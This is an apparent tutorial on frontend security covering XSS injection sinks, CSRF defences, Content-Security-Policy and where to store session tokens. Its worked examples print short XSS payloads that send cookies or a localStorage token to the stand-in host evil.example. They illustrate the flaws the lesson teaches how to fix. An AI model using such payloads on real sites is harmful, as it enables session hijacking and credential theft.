Most frontend security incidents don't come from a broken crypto algorithm or a misconfigured firewall — they come from a text field. A comment box that renders raw HTML, a cookie without the right flag, a token stashed in `localStorage` "just for now." These are ordinary frontend decisions, made under deadline pressure, that quietly open the door to account takeover. If you've ever wondered why a code reviewer flinched at `dangerouslySetInnerHTML` or asked "is that cookie `httpOnly`?", this lesson is about why those questions matter and what to do instead.

We'll cover the four things a frontend engineer is actually expected to reason about: cross-site scripting (XSS), cross-site request forgery (CSRF), Content-Security-Policy (CSP), and where to put sensitive data on the client in the first place.

## XSS: getting the attacker's script to run as you

Cross-site scripting means an attacker gets their JavaScript to execute in your page, in your user's authenticated session. Once that happens, the attacker's script can read the DOM, make requests with the user's cookies, and exfiltrate anything in `localStorage` — it's running with full page privileges, not sandboxed in any way.

The vulnerability almost always traces back to an **injection sink**: a place in your code that takes a string and turns it into live HTML or executable script, without checking where that string came from.

Common sinks:

- `element.innerHTML = userInput`
- React's `dangerouslySetInnerHTML`
- Vue's `v-html`
- `document.write(userInput)`
- Building a URL string for `<a href>` from user input without validating the scheme (a `javascript:` URL is a valid injection vector)
- `eval`, `new Function(...)`, or passing a string to `setTimeout`

Every one of these is fine when the string is fully under your control. They become vulnerabilities the moment the string includes anything a user typed, anything from a query parameter, or anything fetched from a third party (a comment, a bio field, a product description someone else wrote).

### The fix: escape by default, sanitize by exception

The default posture should be: user-generated content is text, not HTML. React, Vue, and Angular all escape interpolated content automatically when you use their normal text-binding syntax — the risk only appears when you explicitly opt out (`dangerouslySetInnerHTML`, `v-html`, manual DOM APIs).

If you genuinely need to render user-authored HTML — a rich-text comment, a markdown preview — run it through a sanitizing library (DOMPurify is the standard choice) that strips `<script>` tags, inline event handlers (`onerror`, `onclick`), and dangerous attributes, and allow-lists the tags you actually want to support. Don't write your own sanitizer with regex; HTML parsing has enough edge cases that hand-rolled filters are reliably bypassable.

### Worked example

Say you're rendering a user's profile bio on a public page:

```js
// Vulnerable: bio is attacker-controlled text rendered as HTML
profileEl.innerHTML = user.bio;
```

If `user.bio` is `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`, the browser tries to load a broken image, fires `onerror`, and runs the attacker's script — which just shipped the visitor's cookies to `evil.example`. No `<script>` tag needed; the sink doesn't care what the payload's shape is, only that it's HTML.

Two fixes, in order of preference:

```js
// Fix 1: treat it as text, not HTML (correct if bio has no formatting)
profileEl.textContent = user.bio;
```

```js
// Fix 2: if you must allow limited HTML formatting, sanitize first
import DOMPurify from 'dompurify';
profileEl.innerHTML = DOMPurify.sanitize(user.bio, { ALLOWED_TAGS: ['b', 'i', 'a'] });
```

`textContent` never interprets its input as markup, so there's no sink at all. The sanitized version keeps a narrow allow-list of tags and strips everything else, including the `onerror` handler.

## CSRF: tricking the browser into spending your session

Cross-site request forgery is a different attack shape: the attacker doesn't need to run code in your page at all. They just need your browser to make a request to a site you're already logged into, from a page they control. Browsers attach cookies to requests based on the target domain, not the page that initiated the request — so a hidden form or `<img>` tag on `evil.example` that POSTs to `bank.example/transfer` will happily carry your `bank.example` session cookie along.

This only works because cookies are attached automatically. It's specifically a cookie-based-session problem: if your app authenticates with a bearer token that your JS code has to manually attach as an `Authorization` header, a third-party page has no way to make the browser send that header, so CSRF doesn't apply the same way. (See [Authentication & Authorization on the Frontend](/concepts/authentication-and-authorization-on-the-frontend) for the trade-offs of cookie sessions versus bearer tokens more broadly.)

### The two mitigations that matter

**`SameSite` cookies.** Setting `Set-Cookie: session=...; SameSite=Lax` (or `Strict`) tells the browser not to send that cookie on cross-site requests initiated by another site — `Lax` still allows top-level navigation (clicking a link) to carry the cookie, `Strict` blocks even that. `Lax` is the sane default for most session cookies today, and most browsers now treat unset `SameSite` as `Lax` by default.

**Anti-CSRF tokens.** Belt-and-suspenders on top of `SameSite`: the server issues a random token tied to the user's session, the frontend includes it as a custom header or hidden form field on state-changing requests, and the server rejects any request missing a valid token. A cross-site page can trigger the request but can't read the token to include it (that would require reading the page's DOM cross-origin, which the browser's same-origin policy already blocks), so the forged request fails server-side validation.

Use both where you can — `SameSite` is a strong default that costs nothing to set, and anti-CSRF tokens protect you against older browsers or unusual cookie configurations where `SameSite` doesn't cover you.

## CSP: a second wall, not the first one

Content-Security-Policy is an HTTP response header (or `<meta>` tag) that tells the browser which sources of scripts, styles, images, and connections a page is allowed to load and execute. A strict policy like:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

means that even if an attacker manages to inject `<script src="https://evil.example/payload.js">` into your page — despite your sanitization — the browser will refuse to execute it, because `evil.example` isn't in the allowed `script-src` list. The same goes for inline `<script>` blocks and inline event handlers if you don't allow `unsafe-inline`.

CSP is defense in depth. It doesn't stop you from having an XSS bug; it limits what that bug can do once it exists. The two commonly overlap in casual conversation ("just use CSP to prevent XSS") but they solve different layers of the problem — sanitize your inputs first, and treat CSP as the safety net for the sink you didn't catch.

## Where sensitive data should live on the client

Once a user is authenticated, something has to hold their session identifier or token between requests. The three realistic options behave very differently under attack.

**Cookies with `httpOnly`, `Secure`, and `SameSite` set.** `httpOnly` means JavaScript cannot read the cookie at all (`document.cookie` won't show it) — so even a successful XSS payload can't steal it directly. `Secure` ensures it's only ever sent over HTTPS. This is the strongest option for session identifiers, at the cost of the CSRF exposure discussed above (which you mitigate with `SameSite` + tokens, not by avoiding cookies).

**`localStorage`.** Plain, JS-readable, persists across tabs and browser restarts until explicitly cleared. Convenient for tokens you need to attach manually to API calls — but any successful XSS on your page can read it and exfiltrate it in one line: `fetch('https://evil.example', {body: localStorage.getItem('token')})`. There's no flag that protects it from script access; that's the entire point of the API.

**`sessionStorage`.** Same JS-readable exposure as `localStorage`, but scoped to a single tab and cleared when that tab closes. It reduces the *window* of exposure (a token isn't sitting around for weeks) but does nothing against a live XSS payload running right now — the attacker's script is executing in the same tab, so it can read `sessionStorage` just as easily.

The practical takeaway: if you can put the session credential in an `httpOnly` cookie, do it — it's the one storage location that survives an XSS bug. If your architecture requires a token the frontend must read and attach itself (some SPA/API-gateway setups do), understand that you're accepting XSS as a direct path to token theft, and your sanitization and CSP discipline need to be correspondingly tighter.

<Callout type="warning">
  A common mistake: treating `sessionStorage` as "the secure one" because it sounds temporary, and storing an auth token there instead of `localStorage` as a security fix. It isn't a fix — both are equally readable by any script running on the page, which is exactly what an XSS payload is. The property that actually matters is JS-readability (`httpOnly` cookies: no; both Web Storage APIs: yes), not lifetime.
</Callout>

## Putting it together

None of these four defenses substitutes for another. Sanitize HTML-injection sinks so scripts don't get in. Set `SameSite` and use anti-CSRF tokens so cookie-based sessions can't be ridden by other sites. Ship a real CSP so that even a missed sink can't execute a remote payload. And put session credentials in `httpOnly` cookies where you can, because that's the one storage choice that keeps working even after the other layers fail. A security review that only checks one of these is checking one lock on a door with four.
